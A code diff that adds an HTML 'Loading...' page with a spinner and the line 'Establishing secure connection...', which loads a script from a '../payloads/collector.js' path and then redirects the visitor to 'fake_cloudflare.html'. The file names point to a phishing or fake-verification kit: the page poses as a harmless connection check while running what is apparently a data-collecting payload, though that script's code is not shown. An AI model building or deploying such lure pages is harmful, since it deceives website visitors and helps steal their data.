@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <style>
+        body { background: #0a0e27; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: monospace; }
+        .loader { text-align: center; color: #0f0; }
+        .spinner { width: 40px; height: 40px; border: 3px solid #333; border-top: 3px solid #0f0; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+    <script src="../payloads/collector.js"></script>
+</head>
+<body>
+    <div class="loader">
+        <div class="spinner"></div>
+        <p>Establishing secure connection...</p>
+    </div>
+    <script>setTimeout(() => { window.location.href = 'fake_cloudflare.html'; }, 3000);</script>
+</body>
+</html>
